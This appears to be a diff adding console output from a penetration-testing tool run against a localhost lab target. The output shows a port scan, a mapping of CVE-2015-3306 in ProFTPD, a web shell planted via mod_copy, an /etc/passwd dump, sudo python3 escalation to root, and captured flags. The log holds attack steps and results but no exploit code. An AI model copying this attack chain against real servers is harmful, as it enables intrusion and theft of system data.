@@ -1,0 +1,86 @@
+============================================================
+             RED TEAM PENETRATION SUITE - SSII               
+                NIST 800-115 COMPLIANT TOOL                  
+============================================================
+[*] Starting scan on target 127.0.0.1...
+[+] Port 2121 is OPEN. Banner: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
+[+] Port 8080 is OPEN. Banner: Server: Apache/2.4.7 (Ubuntu)
+[+] Port 3306 is OPEN. Banner: 
+5.5.47-0ubuntu0.14.04.1-log
+
+==================================================
+         VULNERABILITY ANALYSIS (CVE MAPPING)         
+==================================================
+[CRITICAL] FTP Service (ProFTPD 1.3.5) matches CVE-2015-3306 (mod_copy).
+  - Description: The mod_copy module allows remote attackers to read and write arbitrary files via SITE CPFR/CPTO commands.
+  - Severity: 10.0 (CRITICAL) - CVSS v2.0
+  - CWE-284: Improper Access Control
+[HIGH] HTTP Web Application has active diagnostic/debug endpoint exposed.
+  - Description: Internal debug script /debug.php allows remote execution of administrative commands via the 'cmd' parameter.
+  - Severity: 9.8 (CRITICAL) - CVSS v3.x
+  - CWE-94: Code Injection / Remote Command Execution
+[MEDIUM] MySQL database version 5.5.47 is exposed.
+  - Description: Older MySQL service. Exposing database ports directly to the network violates best security practices.
+  - Severity: 5.0 (MEDIUM) - CVSS v3.x
+  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
+
+==================================================
+         EXPLORATION & EXPLOITATION: CVE-2015-3306    
+==================================================
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
+
+FTP CPFR -> 350 File or directory exists, ready for destination name
+FTP CPTO -> 250 Copy successful
+[+] Exploitation successful! Web shell /backdoor.php created.
+
+==================================================
+         POST-EXPLOITATION & FLAG HARVESTING         
+==================================================
+[*] Retrieving basic system metadata via /backdoor.php...
+  - Current User: www-data
+  - Shell Identity: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  - Kernel Version: Linux public-agency-server 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+
+[*] Exfiltrating simulated system files...
+--- /etc/passwd ---
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Database Admin:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false
+redteam:x:1000:1000:RedTeamPro User,,,:/home/redteam:/bin/bash
+-------------------
+
+[*] Retrieving User Privilege Flag...
+[+] User Flag: FLAG{REDTEAMPRO_SYSTEM_OWNED_NIST_800_115_SUCCESS}
+
+==================================================
+         PRIVILEGE ESCALATION (NIST 800-115)         
+==================================================
+[*] Checking sudo privileges...
+--- sudo -l output ---
+Matching Defaults entries for www-data on public-agency-server:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on public-agency-server:
+    (root) NOPASSWD: /usr/bin/python3
+----------------------
+[+] Privilege escalation path found! (NOPASSWD python3)
+[*] Executing root shell payload to read /root/flag_root.txt...
+[+] Root Flag: FLAG{ROOT_LEVEL_PRIVILEGE_ESCALATION_COMPLETED_CVE_2015_3306}
